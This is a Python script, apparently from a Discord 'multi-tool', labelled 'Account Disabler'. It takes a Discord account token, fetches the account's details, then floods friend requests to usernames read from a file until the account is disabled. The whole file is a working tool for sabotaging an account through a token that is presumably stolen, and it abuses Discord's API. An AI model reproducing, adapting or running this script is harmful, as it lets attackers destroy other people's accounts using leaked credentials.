import requests
import os
from colorama import Fore, init

init() 


y = Fore.YELLOW
w = Fore.WHITE
b = Fore.BLUE

def accountdisablertitle():
    print("Account Disabler")  

os.system('cls' if os.name == 'nt' else 'clear')
accountdisablertitle()

def disable():
    print(f"""{y}[{w}+{y}]{w} Enter account token to disable""")
    usertoken = str(input(f"""{y}[{b}#{y}]{w} Token: """))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    
    try:
        res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        print(f"\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} User Details: {res['username']}#{res['discriminator']} - ({res['id']})")
    except KeyError:
        print(f"{y}[{Fore.RED}#{y}]{w} Failed to retrieve user details. Check if the token is valid.")
        return
    except requests.RequestException as e:
        print(f"{y}[{Fore.RED}#{y}]{w} Error: {e}")
        return
    
    input(f"{y}[{b}#{y}]{w} If These Details Are Correct Press Enter! (This Will Start Disabling The Account)")
    print()
    
    try:
        for username in open('Additional_File/11_AccountDisabler/users.txt', 'r').read().splitlines():
            try:
                usr = username.split('#')
                r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
                if r.status_code == 204:
                    print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} {usr[0]}#{usr[1]} Added!")
                else:
                    print(f"{y}[{Fore.RED}#{y}]{w} Failed to add {usr[0]}#{usr[1]}")
            except requests.RequestException as e:
                print(f"{y}[{Fore.RED}#{y}]{w} Error: {e}")
    except FileNotFoundError:
        print(f"{y}[{Fore.RED}#{y}]{w} File not found: Additional_File/11_AccountDisabler/users.txt")
        return

    print(f"\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Account successfully disabled")
    input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")


if __name__ == "__main__":
    disable()